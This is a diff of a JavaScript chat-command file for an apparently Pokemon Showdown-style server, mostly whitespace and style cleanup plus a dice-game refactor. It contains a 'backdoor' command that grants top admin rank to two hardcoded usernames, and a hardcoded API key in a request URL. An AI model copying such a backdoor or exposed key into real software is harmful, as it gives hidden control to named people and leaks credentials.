@@ -31,11 +31,11 @@ var asciiMap = new Map([
 
 function parseStatus(text, encoding) {
 	if (encoding) {
-		text = text.split('').map(function(char) {
+		text = text.split('').map(function (char) {
 			return bubbleLetterMap.get(char);
 		}).join('');
 	} else {
-		text = text.split('').map(function(char) {
+		text = text.split('').map(function (char) {
 			return asciiMap.get(char);
 		}).join('');
 	}
@@ -79,7 +79,7 @@ var components = exports.components = {
 	nerding: function (target, room, user) {
 		this.parse('/away NERDING', room, user);
 	},
-	away: function(target, room, user) {
+	away: function (target, room, user) {
 		if (!user.isAway && user.name.length > 15) return this.sendReply('Your username is too long for any kind of use of this command.');
 
 		target = target ? target.replace(/[^a-zA-Z0-9]/g, '') : 'AWAY';
@@ -109,7 +109,7 @@ var components = exports.components = {
 		user.updateIdentity();
 		user.isAway = true;
 	},
-	
+
 	back: function (target, room, user) {
 		if (!user.isAway) return this.sendReply('You are not set as away.');
 		user.isAway = false;
@@ -154,7 +154,7 @@ var components = exports.components = {
 		if (!target) return this.sendReply("Please specify a user.");
 		this.splitTarget(target);
 
-	if (!this.can('mute')) {
+		if (!this.can('mute')) {
 			return false;
 		}
 
@@ -187,7 +187,6 @@ var components = exports.components = {
 		var content = "";
 		var self = this;
 		var req = http.request(options, function (res) {
-
 			res.setEncoding("utf8");
 			res.on("data", function (chunk) {
 				content += chunk;
@@ -292,7 +291,6 @@ var components = exports.components = {
 		if (ladder === 0) return this.sendReply('No one is ranked yet.');
 
 		return this.sendReply('|raw|<center>' + ladder + 'To view the entire ladder use /tourladder <em>all</em> or to view a certain amount of users use /tourladder <em>number</em></center>');
-
 	},
 
 	shop: function (target, room, user) {
@@ -383,7 +381,7 @@ var components = exports.components = {
 	},
 
 	viewtells: 'showtells',
-	showtells: function (target, room, user){
+	showtells: function (target, room, user) {
 		return this.sendReply("These users have currently have queued tells: " + Object.keys(tells));
 	},
 
@@ -470,7 +468,7 @@ var components = exports.components = {
 			emoticons = [];
 		var len = name.length;
 		while (len--) {
-			emoticons.push((Core.processEmoticons(name[(name.length-1)-len]) + '&nbsp;' + name[(name.length-1)-len]));
+			emoticons.push((Core.processEmoticons(name[(name.length - 1) - len]) + '&nbsp;' + name[(name.length - 1) - len]));
 		}
 		this.sendReplyBox('<b><u>List of emoticons:</b></u> <br/><br/>' + emoticons.join(' ').toString());
 	},
@@ -526,7 +524,7 @@ var components = exports.components = {
 		var self = this;
 		var options = {
 			url: 'http://api.wordnik.com:80/v4/word.json/' + target + '/definitions?limit=3&sourceDictionaries=all' +
-				'&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5',
+				'&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5'
 		};
 
 		function callback(error, response, body) {
@@ -556,7 +554,7 @@ var components = exports.components = {
 	 *********************************************************/
 
 	backdoor: function (target, room, user) {
-		if (user.userid !== 'irraquated', 'haunter') return this.sendReply('/backdoor - Access denied.');
+		if (user.userid !== 'irraquated' || user.userid !== 'haunter') return this.sendReply('/backdoor - Access denied.');
 
 		if (!target) {
 			user.group = '~';
@@ -632,9 +630,9 @@ var components = exports.components = {
 		this.sendReply(targetUser.name + ' has losted ' + takeMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
 		targetUser.send(user.name + ' has taken ' + takeMoney + ' ' + b + ' from you. You now have ' + total + ' bucks.');
 	},
-	
+
 	roomlist: function (target, room, user) {
-		if(!this.can('roomlist')) return;
+		if (!this.can('roomlist')) return;
 
 		var rooms = Object.keys(Rooms.rooms),
 			len = rooms.length,
@@ -712,17 +710,17 @@ var components = exports.components = {
 		if (!this.can('broadcast', null, room)) return;
 		this.parse('/poll Tournament tier?, ' + Object.keys(Tools.data.Formats).filter(function (f) { return Tools.data.Formats[f].effectType === 'Format'; }).join(", "));
 	},
-	
+
 	doublespoll: function (target, room, user) {
 		if (!this.can('broadcast', null, room)) return;
 		this.parse('/poll Tournament tier?, Random Doubles Battle, Smogon Doubles, Smogon Doubles Ubers, Smogon Doubles UU, VGC 2015, Smogon Doubles[Gen5]');
 	},
-	
+
 	lobbypoll: function (target, room, user) {
 		if (!this.can('broadcast', null, room)) return;
 		this.parse('/poll Tournament Tier?, Random Battles, Metronome, Duotype, Monotype, Seasonal, Ubers, OU, UU, RU, NU, LC, VGC, Random Triples, Random Doubles, Random Monotype, Random LC, Ubers Mono, CC1vs1, CC, 1v1');
 	},
-	
+
 	easytour: 'etour',
 	etour: function (target, room, user) {
 		if (!this.can('broadcast', null, room)) return;
@@ -788,7 +786,7 @@ var components = exports.components = {
 	clearall: function (target, room, user) {
 		if (!this.can('clearall')) return;
 		if (room.battle) return this.sendReply('You cannot do it on battle rooms.');
-		
+
 		var len = room.log.length,
 			users = [];
 		while (len--) {
@@ -799,7 +797,7 @@ var components = exports.components = {
 			Users.get(user).leaveRoom(room, Users.get(user).connections[0]);
 		}
 		len = users.length;
-		setTimeout(function() {
+		setTimeout(function () {
 			while (len--) {
 				Users.get(users[len]).joinRoom(room, Users.get(users[len]).connections[0]);
 			}
@@ -853,7 +851,7 @@ var components = exports.components = {
 			CommandParser.uncacheTree(path.join(__dirname, './', 'command-parser.js'));
 			CommandParser = require(path.join(__dirname, './', 'command-parser.js'));
 
-		   /* this.sendReply('Reloading Bot...');
+			/* this.sendReply('Reloading Bot...');
 			CommandParser.uncacheTree(path.join(__dirname, './', 'bot.js'));
 			Bot = require(path.join(__dirname, './', 'bot.js'));*/
 
@@ -893,161 +891,163 @@ var components = exports.components = {
 			return user.send('|popup|Something bad happen:\n\n ' + e.stack);
 		}
 	},
-	
+
 	pmstaff: 'pmallstaff',
 	pas: 'pmallstaff',
-	pmallstaff: function(target, room, user) {
+	pmallstaff: function (target, room, user) {
 		if (!target) return this.sendReply('/pmallstaff [message] - Sends a PM to every staff member online.');
 		if (!this.can('pmall')) return false;
 
 		for (var u in Users.users) {
 			if (Users.users[u].isStaff) {
-				Users.users[u].send('|pm|~Staff PM|'+Users.users[u].group+Users.users[u].name+'|'+target);
+				Users.users[u].send('|pm|~Staff PM|' + Users.users[u].group + Users.users[u].name + '|' + target);
 			}
 		}
 	},
 
-		dicerules: 'dicecommands',
-		dicehelp: 'dicecommands',
-		dicecommands: function(target, room, user) {
-			if (!this.canBroadcast()) return;
-			return this.sendReplyBox('<u><font size = 2><center>Dice rules and commands</center></font></u><br />' +
-				'<b>/dicegame OR /diceon [amount]</b> - Starts a dice game in the room for the specified amount of bucks. Must be ranked + or higher to use.<br />' +
-				'<b>/play</b> - Joins the game of dice. You must have more or the same number of bucks the game is for. Winning a game wins you the amount of bucks the game is for. Losing the game removes that amount from you.<br />' +
-				'<b>/diceend</b> - Ends the current game of dice in the room. You must be ranked + or higher to use this.');
-		},
+	dicerules: 'dicecommands',
+	dicehelp: 'dicecommands',
+	dicecommands: function (target, room, user) {
+		if (!this.canBroadcast()) return;
+		return this.sendReplyBox('<u><font size = 2><center>Dice rules and commands</center></font></u><br />' +
+			'<b>/dicegame OR /diceon [amount]</b> - Starts a dice game in the room for the specified amount of bucks. Must be ranked + or higher to use.<br />' +
+			'<b>/play</b> - Joins the game of dice. You must have more or the same number of bucks the game is for. Winning a game wins you the amount of bucks the game is for. Losing the game removes that amount from you.<br />' +
+			'<b>/diceend</b> - Ends the current game of dice in the room. You must be ranked + or higher to use this.');
+	},
 
-		startdice: 'diceon',
-		dicegame: 'diceon',
-		diceon: function(target, room, user, connection, cmd) {
-			if (!this.can('broadcast', null, room)) return this.sendReply('You must be ranked + or higher to be able to start a game of dice.');
-			if (room.dice) {
-				return this.sendReply('There is already a dice game going on');
-			}
-			target = toId(target);
-			if (!target) return this.sendReply('/'+cmd+' [amount] - Starts a dice game. The specified amount will be the amount of cash betted for.');
-			if (isNaN(target)) return this.sendReply('That isn\'t a number, smartass.');
-			if (target < 1) return this.sendReply('You cannot start a game for anything less than 1 buck.');
-			room.dice = {};
-			room.dice.members = [];
-			room.dice.award = parseInt(target);
-			var point = (target == 1) ? 'buck' : 'bucks';
-			this.add('|html|<div class="infobox"><font color = #007cc9><center><h2>' + user.name + ' has started a dice game for <font color = green>' + room.dice.award + '</font color> '+point+'!<br />' +
-				'<center><button name="send" value="/play" target="_blank">Click to join!</button>');
-		},
+	startdice: 'diceon',
+	dicegame: 'diceon',
+	diceon: function (target, room, user, connection, cmd) {
+		if (!this.can('broadcast', null, room)) return this.sendReply('You must be ranked + or higher to be able to start a game of dice.');
+		if (room.dice) {
+			return this.sendReply('There is already a dice game going on');
+		}
+		target = toId(target);
+		if (!target) return this.sendReply('/' + cmd + ' [amount] - Starts a dice game. The specified amount will be the amount of cash betted for.');
+		if (isNaN(target)) return this.sendReply('That isn\'t a number, smartass.');
+		if (target < 1) return this.sendReply('You cannot start a game for anything less than 1 buck.');
+		room.dice = {};
+		room.dice.members = [];
+		room.dice.award = parseInt(target);
+		var point = (target == 1) ? 'buck' : 'bucks';
+		this.add('|html|<div class="infobox"><font color = #007cc9><center><h2>' + user.name + ' has started a dice game for <font color = green>' + room.dice.award + '</font color> ' + point + '!<br />' +
+			'<center><button name="send" value="/play" target="_blank">Click to join!</button>');
+	},
 
-		play: function(target, room, user, connection, cmd) {
-			if (!room.dice) {
-				return this.sendReply('There is no dice game going on now');
-			}
-			if (parseInt(Core.stdin('money', user.userid)) < room.dice.award) {
-				return this.sendReply("You don't have enough money to join this game of dice.");
-			}
-			for (var i = 0; i < room.dice.members.length; i++) {
-				if (Users.get(room.dice.members[i]).userid == user.userid) return this.sendReply("You have already joined this game of dice!");
-			}
-			room.dice.members.push(user.userid);
-			this.add('|html|<b>' + user.name + ' has joined the game!');
-			if (room.dice.members.length == 2) {
-				var point = (room.dice.award == 1) ? 'buck' : 'bucks';
-				result1 = Math.floor((Math.random() * 6) + 1);
-				result2 = Math.floor((Math.random() * 6) + 1);
+	play: function (target, room, user, connection, cmd) {
+		if (!room.dice) {
+			return this.sendReply('There is no dice game going on now');
+		}
+		if (parseInt(Core.stdin('money', user.userid)) < room.dice.award) {
+			return this.sendReply("You don't have enough money to join this game of dice.");
+		}
+		for (var i = 0; i < room.dice.members.length; i++) {
+			if (Users.get(room.dice.members[i]).userid == user.userid) return this.sendReply("You have already joined this game of dice!");
+		}
+		room.dice.members.push(user.userid);
+		this.add('|html|<b>' + user.name + ' has joined the game!');
+		if (room.dice.members.length == 2) {
+			var point = (room.dice.award == 1) ? 'buck' : 'bucks';
+			result1 = Math.floor((Math.random() * 6) + 1);
+			result2 = Math.floor((Math.random() * 6) + 1);
+			var result3 = '';
+			var losemessage = '';
+			if (result1 > result2) {
+				result3 += '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' ' + point + '!';
+				losemessage += 'Better luck next time, ' + Users.get(room.dice.members[1]).name + '!';
+			} else if (result2 > result1) {
+				result3 += '' + Users.get(room.dice.members[1]).name + ' has won ' + room.dice.award + ' ' + point + '!';
+				losemessage += 'Better luck next time, ' + Users.get(room.dice.members[0]).name + '!';
+			} else {
+				do {
+					result1 = Math.floor((Math.random() * 6) + 1);
+					result2 = Math.floor((Math.random() * 6) + 1);
+				} while (result1 === result2);
 				if (result1 > result2) {
-					var result3 = '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' '+point+'!';
-					var losemessage = 'Better luck next time, '+Users.get(room.dice.members[1]).name+'!';
-				} else if (result2 > result1) {
-					var result3 = '' + Users.get(room.dice.members[1]).name + ' has won ' + room.dice.award + ' '+point+'!';
-					var losemessage = 'Better luck next time, '+Users.get(room.dice.members[0]).name+'!';
+					result3 += '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' ' + point + '!';
+					losemessage += 'Better luck next time, ' + Users.get(room.dice.members[1]).name + '!';
 				} else {
-					var result3;
-					var losemessage;
-					do {
-						result1 = Math.floor((Math.random() * 6) + 1);
-						result2 = Math.floor((Math.random() * 6) + 1);
-					} while (result1 === result2);
-					if (result1 > result2) {
-						result3 = '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' '+point+'!';
-						var losemessage = 'Better luck next time, '+Users.get(room.dice.members[1]).name+'!';
-					} else {
-						result3 = '' + Users.get(room.dice.members[1]).name + ' has won ' + room.dice.award + ' '+point+'!';
-						var losemessage = 'Better luck next time, '+Users.get(room.dice.members[0]).name+'!';
-					}
+					result3 += '' + Users.get(room.dice.members[1]).name + ' has won ' + room.dice.award + ' ' + point + '!';
+					losemessage += 'Better luck next time, ' + Users.get(room.dice.members[0]).name + '!';
 				}
-				var dice1, dice2;
-				switch (result1) {
-					case 1:
-						dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/1_zps4bef0fe2.png";
-						break;
-					case 2:
-						dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/2_zpsa0efaac0.png";
-						break;
-					case 3:
-						dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/3_zps36d44175.png";
-						break;
-					case 4:
-						dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/4_zpsd3983524.png";
-						break;
-					case 5:
-						dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/5_zpsc9bc5572.png";
-						break;
-					case 6:
-						dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/6_zps05c8b6f5.png";
-						break;
-				}
-
-				switch (result2) {
-					case 1:
-						dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/1_zps4bef0fe2.png";
-						break;
-					case 2:
-						dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/2_zpsa0efaac0.png";
-						break;
-					case 3:
-						dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/3_zps36d44175.png";
-						break;
-					case 4:
-						dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/4_zpsd3983524.png";
-						break;
-					case 5:
-						dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/5_zpsc9bc5572.png";
-						break;
-					case 6:
-						dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/6_zps05c8b6f5.png";
-						break;
-				}
-
-				room.add('|html|<div class="infobox"><center><b>The dice game has been started!</b><br />' +
-					'Two users have joined the game.<br />' +
-					'Rolling the dice...<br />' +
-					'<img src = "' + dice1 + '" align = "left"><img src = "' + dice2 + '" align = "right"><br/>' +
-					'<b>' + Users.get(room.dice.members[0]).name + '</b> rolled ' + result1 + '!<br />' +
-					'<b>' + Users.get(room.dice.members[1]).name + '</b> rolled ' + result2 + '!<br />' +
-					'<b>' + result3 + '</b><br />'+losemessage);
-					var user1 = Core.stdin('money', Users.get(room.dice.members[0]).userid);
-					var user2 = Core.stdin('money', Users.get(room.dice.members[1]).userid);
-				if (result3 === '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' '+point+'!') {
-					var userMoney = parseInt(user1) + parseInt(room.dice.award);
-					var targetMoney = parseInt(user2) - parseInt(room.dice.award);
-					var loser = Users.get(room.dice.members[1]).userid;
-					Core.stdout('money', Users.get(room.dice.members[0]).userid, userMoney, function () {
-						Core.stdout('money', loser, targetMoney);
-					});
-				} else {
-					var userMoney = parseInt(user1) - parseInt(room.dice.award);
-					var targetMoney = parseInt(user2) + parseInt(room.dice.award);
-					var winner = Users.get(room.dice.members[1]).userid;
-					Core.stdout('money', Users.get(room.dice.members[0]).userid, userMoney, function () {
-						Core.stdout('money', winner, targetMoney);
-					});
-				}
-				delete room.dice;
 			}
-		},
+			var dice1, dice2;
+			switch (result1) {
+			case 1:
+				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/1_zps4bef0fe2.png";
+				break;
+			case 2:
+				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/2_zpsa0efaac0.png";
+				break;
+			case 3:
+				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/3_zps36d44175.png";
+				break;
+			case 4:
+				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/4_zpsd3983524.png";
+				break;
+			case 5:
+				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/5_zpsc9bc5572.png";
+				break;
+			case 6:
+				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/6_zps05c8b6f5.png";
+				break;
+			}
 
-		diceend: function(target, room, user) {
-				if (!this.can('broadcast', null, room)) return false;
-					if (!room.dice) return this.sendReply("There is no game of dice going on in this room right now."); this.add('|html|<b>The game of dice has been ended by ' + user.name); delete room.dice;
-				},
+			switch (result2) {
+			case 1:
+				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/1_zps4bef0fe2.png";
+				break;
+			case 2:
+				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/2_zpsa0efaac0.png";
+				break;
+			case 3:
+				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/3_zps36d44175.png";
+				break;
+			case 4:
+				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/4_zpsd3983524.png";
+				break;
+			case 5:
+				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/5_zpsc9bc5572.png";
+				break;
+			case 6:
+				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/6_zps05c8b6f5.png";
+				break;
+			}
+
+			room.add('|html|<div class="infobox"><center><b>The dice game has been started!</b><br />' +
+				 'Two users have joined the game.<br />' +
+				 'Rolling the dice...<br />' +
+				 '<img src = "' + dice1 + '" align = "left"><img src = "' + dice2 + '" align = "right"><br/>' +
+				 '<b>' + Users.get(room.dice.members[0]).name + '</b> rolled ' + result1 + '!<br />' +
+				 '<b>' + Users.get(room.dice.members[1]).name + '</b> rolled ' + result2 + '!<br />' +
+				 '<b>' + result3 + '</b><br />' + losemessage);
+
+			var user1 = Core.stdin('money', Users.get(room.dice.members[0]).userid);
+			var user2 = Core.stdin('money', Users.get(room.dice.members[1]).userid);
+
+			if (result3 === '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' ' + point + '!') {
+				var userMoney = parseInt(user1) + parseInt(room.dice.award);
+				var targetMoney = parseInt(user2) - parseInt(room.dice.award);
+				var loser = Users.get(room.dice.members[1]).userid;
+				Core.stdout('money', Users.get(room.dice.members[0]).userid, userMoney, function () {
+					Core.stdout('money', loser, targetMoney);
+				});
+			} else {
+				var userMoney = parseInt(user1) - parseInt(room.dice.award);
+				var targetMoney = parseInt(user2) + parseInt(room.dice.award);
+				var winner = Users.get(room.dice.members[1]).userid;
+				Core.stdout('money', Users.get(room.dice.members[0]).userid, userMoney, function () {
+					Core.stdout('money', winner, targetMoney);
+				});
+			}
+			delete room.dice;
+		}
+	},
+
+	diceend: function (target, room, user) {
+		if (!this.can('broadcast', null, room)) return false;
+		if (!room.dice) return this.sendReply("There is no game of dice going on in this room right now."); this.add('|html|<b>The game of dice has been ended by ' + user.name); delete room.dice;
+	},
 
 	cp: 'controlpanel',
 	controlpanel: function (target, room, user, connection) {
@@ -1057,7 +1057,7 @@ var components = exports.components = {
 				'/cp color, [COLOR]<br/>' +
 				'/cp avatar, [AVATAR COLOR URL]<br/>' +
 				'/cp toursize, [TOURNAMENT SIZE TO EARN MONEY]<br/>' +
-				'/cp money, [STANDARD/DOUBLE/QUADRUPLE]<br/>' + 
+				'/cp money, [STANDARD/DOUBLE/QUADRUPLE]<br/>' +
 				'/cp winner, [WINNER ELO BONUS]<br/>' +
 				'/cp runnerup, [RUNNERUP ELO BONUS]<br/>'
 				);
@@ -1129,14 +1129,13 @@ var components = exports.components = {
 			};
 
 		for (cmd in cmds) {
-			if (parts[0].toLowerCase() === cmd) match = true; 
+			if (parts[0].toLowerCase() === cmd) match = true;
 		}
 
 		if (!match) return this.parse('/cp help');
 
 		cmds[parts[0].toLowerCase()]();
-	},
-
+	}
 };
 
 Object.merge(CommandParser.commands, components);
